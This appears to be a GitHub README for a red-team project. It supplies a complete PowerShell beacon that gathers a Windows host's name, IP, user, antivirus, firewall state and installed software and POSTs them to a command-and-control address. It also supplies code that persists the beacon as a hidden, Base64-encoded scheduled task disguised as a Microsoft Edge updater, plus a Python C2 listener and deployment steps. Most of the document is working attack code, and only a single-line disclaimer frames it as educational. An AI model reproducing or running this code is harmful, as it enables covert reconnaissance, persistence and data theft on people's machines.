# System Info Beacon with COM API Persistence

This project demonstrates a PowerShell-based system beacon that collects system information and persists via a hidden Scheduled Task using the COM API. The data is sent to a Command & Control (C2) server built using Python’s `http.server`.

> ⚠️ **Disclaimer**: This project is for educational and authorized red team use only. 

---

## Requirements
2 Virtual Machines(VMs) are required for this demonstration:
- One with Kali Linux/ ParrotOS or any Linux distro : To host C2 server
- One with Windows 10 : To execute the Powershell Code

## Features of Exploit

- Collects critical system metadata (hostname, IP, OS, user, AV, firewall, uptime, software list, etc.)
- Posts data to a remote HTTP server endpoint
- Creates persistent beaconing via a hidden Scheduled Task using the COM API
- Uses Base64-encoded PowerShell for stealth

---

## PowerShell Beacon Script

### One-Time System Info Beacon

```powershell
$hostname = $env:COMPUTERNAME
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "169.*" -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
$user = $env:USERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName -ErrorAction SilentlyContinue) -join ", "
$firewallStatus = (Get-NetFirewallProfile | Select-Object Name, Enabled | Out-String).Trim()
$topProcesses = (Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU | Out-String).Trim()
$software = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object -ExpandProperty DisplayName -ErrorAction SilentlyContinue) -join ", "

$payload = @{
    Hostname  = $hostname
    IP        = $ip
    User      = $user
    OS        = $os
    Uptime    = $uptime
    AV        = $av
    Firewall  = $firewallStatus
    Processes = $topProcesses
    Software  = $software
    Time      = (Get-Date).ToString()
}

try {
    Invoke-WebRequest -Uri "http://192.168.1.193/collect" -Method POST -Body $payload -UseBasicParsing
} catch {}
```

### Beacon Script for Logon Trigger

Encapsulated in a Base64-encoded string for stealth and injected via COM API.

### COM API-Based Persistence

```powershell
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($beaconScript))

$taskName = "MicrosoftEdgeUpdaterService"
$taskDesc = "Microsoft Edge Telemetry Update"

$service = New-Object -ComObject "Schedule.Service"
$service.Connect()

$rootFolder = $service.GetFolder("\")
$taskDef = $service.NewTask(0)

$taskDef.RegistrationInfo.Description = $taskDesc
$taskDef.RegistrationInfo.Author = "Microsoft Corporation"

$trigger = $taskDef.Triggers.Create(9)
$trigger.UserId = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

$action = $taskDef.Actions.Create(0)
$action.Path = "powershell.exe"
$action.Arguments = "-NoProfile -WindowStyle Hidden -EncodedCommand $encoded"

$taskDef.Settings.Enabled = $true
$taskDef.Settings.Hidden = $true
$taskDef.Settings.StartWhenAvailable = $true
$taskDef.Settings.DisallowStartIfOnBatteries = $false

$rootFolder.RegisterTaskDefinition($taskName, $taskDef, 6, $null, $null, 3, $null)
```

---

## Python C2 Server

Run this listener to receive and parse the beacon POSTs:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, unquote_plus

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        parsed = parse_qs(post_data)
        decoded = {k: unquote_plus(v[0]) for k, v in parsed.items()}

        print("\n[+] Beacon Data Received:")
        for key, value in decoded.items():
            print(f"{key.capitalize()}: {value}")

        self.send_response(200)
        self.end_headers()

def run(server_class=HTTPServer, handler_class=C2Handler, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[+] C2 Server Running on Port {port}...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
```

---

## IoC

![image](https://github.com/user-attachments/assets/342278b2-3e80-4802-9799-409bf0719ffc)

> Bottom half cut due to personal data(extracted by the exploit)

---

## Deployment

1. Host the Python server on an attacker-controlled machine:  
   ```bash
   python3 beacon_server.py
   ```
2. Execute the PowerShell beacon script on the target.
3. Beacon data will be received on the Python server.

---

## References

- [Windows COM API for task scheduling](https://learn.microsoft.com/en-us/windows/win32/api/_com/)
- [PowerShell Remoting and System Management Cmdlets](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.5)
- [HTTP Beaconing Techniques](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_beacon-http-https.htm)

---
